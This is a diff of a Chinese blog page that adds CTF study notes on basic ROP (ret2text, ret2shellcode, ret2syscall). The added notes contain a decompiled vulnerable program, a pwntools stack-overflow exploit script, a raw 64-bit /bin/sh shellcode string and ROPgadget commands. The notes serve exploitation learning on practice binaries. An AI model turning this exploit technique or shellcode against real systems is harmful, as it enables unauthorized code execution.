@@ -276,7 +276,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-10-10 21:33:16" itemprop="dateModified" datetime="2019-10-10T21:33:16+08:00">2019-10-10</time>
+                <time title="修改时间：2019-10-11 19:58:32" itemprop="dateModified" datetime="2019-10-11T19:58:32+08:00">2019-10-11</time>
               </span>
             
           
@@ -326,7 +326,29 @@
 </ol>
 <p>对脚本解释一下..<br>process 是运行pwn1 这个可执行文件, payload是构造的字符串, sendline是把payload输入到命令行并且换行, interactive() 切换到交互模式.  </p>
 <h1 id="0x3-Basic-ROP"><a href="#0x3-Basic-ROP" class="headerlink" title="0x3 Basic ROP"></a>0x3 Basic ROP</h1><p>抄ctf-wiki!<br><img src="https://i.loli.net/2019/10/10/SJsgc85pGAQFzko.png" alt><br>二话不说, 就是一通代码段…  </p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>上面说过, retn 的实际指令是 pop eip, 上面的将return address的值换成 fun函数的地址, 其实是换成了fun函数的起始地址, 但是我们其实并不需要运行完整的fun函数, 我们只需要运行system(‘./bin/sh’)这个语句, 这时候我们查看一下上面的汇编代码, 发现在0x401191的位置调用了system函数, 但是调用system函数的时候需要先考虑system的参数问题, 上一行lea rdi, command是在调整参数, 那么只要把eip指向0x401191对应的指令就行, 注意调用函数时候的参数问题, 需要先把参数调整好再调用system函数.  </p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这个东西是在没有system(“./bin/sh”)时候的一种操作.<br>这种方法需要一段内存它是可写可执行的, 并且我们可以想办法写入.<br>从ctf-wiki例题开始看.  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现有gets函数, 可以读入一些东西.<br>看了一下栈中变量的存储情况发现可以修改栈中的return address.<br>并且把输入的内容复制到了buf2段, 我们查看一下buf2对应的段.<br>发现buf2在bss段, 并且有可读可写可执行权限, 那么我们可以先写入shellcode, 然后用任意字符溢出到return address 对应的地址, return address 需要将其更改为buf2对应的地址, 然后就可以运行写入的shellcode获取权限了.<br>pwntools 工具解释.<br>shellcraft.sh()获得32位系统上的shellcode.<br>asm(string)<br>将string汇编转化为二进制.<br>ljust补齐, exp.py中为先输入shellcode, 然后补’a’, ‘a’的个数和shellcode的总字节数加起来为112.<br>脚本.  </p>
+<pre><code class="Python"><span class="comment">#!/usr/bin/env python</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+sh = process(<span class="string">'./ret2shellcode'</span>)
+shellcode = asm(shellcraft.sh())
+buf2_addr = <span class="number">0x804a080</span>
+
+sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))
+sh.interactive()</code></pre>
+<p>附赠64位shellcode一段.  </p>
+<pre><code class="text">&apos;x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&apos;</code></pre>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>我jio的, ctf-wiki上讲的很全很好, 附个链接.<br>注意的一些事情:<br>int 0x80我暂且先将其理解为execve这个函数, 先用一些代码片段修改函数参数, 然后再调用int 0x80  </p>
+<ul>
+<li>ROPgadget安装.  <pre><code class="bash">sudo pip install ropgadget</code></pre>
+</li>
+<li>常用用法<br>ROPgadget –binary filename –string “ /bin/sh”<br>ROPgadget –binary filename –only “pop|ret” | grep ‘eax’<br>ROPgadget –binary filename –only ‘int’  </li>
+</ul>
+
         
       
     </div>
